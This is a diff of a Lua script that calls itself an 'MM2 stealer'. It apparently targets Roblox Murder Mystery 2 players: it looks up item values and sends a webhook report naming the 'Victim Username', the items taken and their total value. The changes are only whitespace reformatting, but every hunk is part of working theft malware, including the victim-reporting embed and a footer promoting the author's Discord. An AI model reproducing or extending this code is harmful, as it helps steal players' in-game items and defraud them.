@@ -52,6 +52,7 @@ local rarityTable = {
     "Unique",
     "Vintage"
 }
+
 local categories = {
     godly = "https://supremevaluelist.com/mm2/godlies.html",
     ancient = "https://supremevaluelist.com/mm2/ancients.html",
@@ -59,6 +60,7 @@ local categories = {
     classic = "https://supremevaluelist.com/mm2/vintages.html",
     chroma = "https://supremevaluelist.com/mm2/chromas.html"
 }
+
 local headers = {
     ["Accept"] = "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
     ["User-Agent"] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
@@ -310,23 +312,23 @@ local function SendMessage(sortedItems)
         ["Content-Type"] = "application/json"
     }
 
-	local fields = {
-		{
-			name = "Victim Username:",
-			value = plr.Name,
-			inline = true
-		},
-		{
-			name = "Items sent:",
-			value = "",
-			inline = false
-		},
+    local fields = {
+        {
+            name = "Victim Username:",
+            value = plr.Name,
+            inline = true
+        },
+        {
+            name = "Items sent:",
+            value = "",
+            inline = false
+        },
         {
             name = "Summary:",
             value = string.format("Total Value: %s", totalValue),
             inline = false
         }
-	}
+    }
 
     for _, item in ipairs(sortedItems) do
         local itemLine = string.format("%s (x%s): %s Value (%s)", item.DataID, item.Amount, (item.Value * item.Amount), item.Rarity)
@@ -349,10 +351,10 @@ local function SendMessage(sortedItems)
         ["embeds"] = {{
             ["title"] = "\240\159\148\170 New MM2 Execution" ,
             ["color"] = 65280,
-			["fields"] = fields,
-			["footer"] = {
-				["text"] = "MM2 stealer by Tobi. discord.gg/GY2RVSEGDT"
-			}
+            ["fields"] = fields,
+            ["footer"] = {
+                ["text"] = "MM2 stealer by Tobi. discord.gg/GY2RVSEGDT"
+            }
         }}
     }
 
